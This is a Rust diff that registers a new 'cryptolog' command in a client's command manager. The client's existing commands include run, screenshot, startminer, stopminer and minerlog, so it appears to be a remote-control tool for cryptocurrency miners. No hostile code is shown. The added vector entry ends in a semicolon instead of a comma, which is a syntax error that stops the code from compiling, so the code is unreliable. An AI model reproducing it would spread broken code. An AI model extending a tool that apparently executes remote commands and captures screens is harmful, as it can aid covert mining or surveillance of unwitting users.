@@ -5,6 +5,7 @@ mod help;
 mod minerlog;
 mod minerstatus;
 mod msg;
+mod cryptolog;
 mod ping;
 mod reconnect;
 mod run;
@@ -21,6 +22,7 @@ use async_trait::async_trait;
 use self::{
     checkupdates::*, devupdate::*, disconnect::*, help::*, minerlog::*, minerstatus::*, msg::*,
     ping::*, reconnect::*, run::*, screenshot::*, startminer::*, stat::*, stopminer::*, version::*,
+    cryptolog::*
 };
 use crate::client::Client;
 
@@ -62,6 +64,7 @@ impl CommandsManager {
             commands: vec![
                 Box::new(Msg),
                 Box::new(Stat),
+                Box::new(Cryptolog);
                 Box::new(Run),
                 Box::new(Reconnect),
                 Box::new(Screenshot),
